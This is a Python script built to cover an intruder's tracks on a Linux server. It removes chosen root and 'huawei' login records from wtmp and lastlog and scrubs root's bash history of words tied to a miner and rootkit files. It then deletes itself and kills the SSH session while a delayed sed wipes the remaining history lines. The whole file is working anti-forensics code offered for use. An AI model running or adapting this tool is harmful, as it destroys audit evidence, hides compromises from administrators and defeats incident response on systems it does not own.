#!/usr/bin/env python
import subprocess, sys, os, struct
LASTLOG_STRUCT = 'l32s256s'
LASTLOG_STRUCT = 'i32s256s'
LASTLOG_STRUCT_SIZE = struct.calcsize(LASTLOG_STRUCT)
def read_log(fname, STRUCT, SIZE):
    result = []
    with open(fname, 'rb') as f:
        while True:
            bytes = f.read(SIZE)
            if not bytes:
                break
            data = struct.unpack(STRUCT, bytes)
            data = [(lambda s: str(s).split("\0", 1)[0])(i) for i in data]
            if data[0] != '0':
                result.append(data)
    return result

def write_log(fname, bindata):
    with open(fname, 'wb') as f:
        for i in bindata:
            f.write(i)
    return

def write_xtmp(fname, data):
    bindata = [struct.pack(XTMP_STRUCT,
        int(d[0]), int(d[1]), d[2], d[3], d[4], d[5],
        int(d[6]), int(d[7]), int(d[8]), int(d[9]),
        int(d[10]), int(d[11]), int(d[12]), int(d[13]), int(d[14])) for d in data]
    bindata.reverse()
    write_log(fname, bindata)

def write_lastlog(fname, data):
    bindata = [struct.pack(LASTLOG_STRUCT,
        int(d[0]), d[1], d[2]) for d in data]
    write_log(fname, bindata)

def read_lastlog(fname):
    return read_log(fname, LASTLOG_STRUCT, LASTLOG_STRUCT_SIZE)

XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)
def read_xtmp(fname):
    data = read_log(fname, XTMP_STRUCT, XTMP_STRUCT_SIZE)
    data.reverse()
    return data

def clean_loginlog():
    login_clean = [('root', 's001'), ('root', 's003'), ('huawei', '121.192.191.104')]
    def match_wtmp(x):
        for name, src in login_clean:
            if (x[4].find(name) >=0) and (x[5].find(src) >=0) :
                return True
        return False
    def match_lastlog(x):
        if (x[2].find(login_clean[1]) >=0):
            return True
        return False
    try:
        data = read_xtmp('/var/log/wtmp')
        clean_data = []
        for i in data:
            if not match_wtmp(i):
                clean_data.append(i)
        write_xtmp('/var/log/wtmp', clean_data)
    except Exception as e:
        print(e)

    try:
        data = read_lastlog('/var/log/lastlog')
        clean_data = []
        for i in data:
            if not match_lastlog(i):
                clean_data.append(i)
        write_lastlog('/var/log/lastlog', clean_data)
    except Exception as e:
        print(e)
    return

def hide_process():
    pass


def delete_myself():
    os.remove(sys.argv[0])
    return

def clean_cmdlog():
    cmd_clean = ['miner', 'kill', '.nv', '.clean', 'libprocess', 'libselinux', 'h.c', 'a.c', '.bash', 'secure', '.pki', '.cc', 'exir', 'wtmp', 'last']
    def match_sensitive(x):
        for i in cmd_clean:
            if x.find(i) >=0:
                return True
        return False

    result = []
    root_history='/root/.bash_history'
    if os.path.isfile(root_history):
        with open(root_history, 'r') as f:
            for i in f.readlines():
                if not match_sensitive(i):
                    result.append(i)
        with open(root_history, 'w') as f:
            f.writelines(result)

    p = subprocess.Popen(['/usr/bin/tail /root/.bash_history'], stdout=subprocess.PIPE, shell=True)
    out = p.stdout.read()
    print(out)

def kill_connection():
    _, port, _, _ = os.environ['SSH_CONNECTION'].split(' ')
    p = subprocess.Popen(['lsof -i tcp:%s'%port], stdout=subprocess.PIPE, shell=True)
    out = p.stdout.read().split('\n')[1]
    pid = out.split()[1]
    p = subprocess.Popen(['''nohup sh -c "sleep 10; sed -i -e '/exir/d' -e '/history/d' /root/.bash_history" >/dev/null &'''], stdout=subprocess.PIPE, shell=True)
    p = subprocess.Popen(['kill -9 %s'%pid], stdout=subprocess.PIPE, shell=True)
    return

def main():
    clean_cmdlog()
    clean_loginlog()
    hide_process()
    delete_myself()
    kill_connection()
    return

if __name__ == '__main__':
    main()
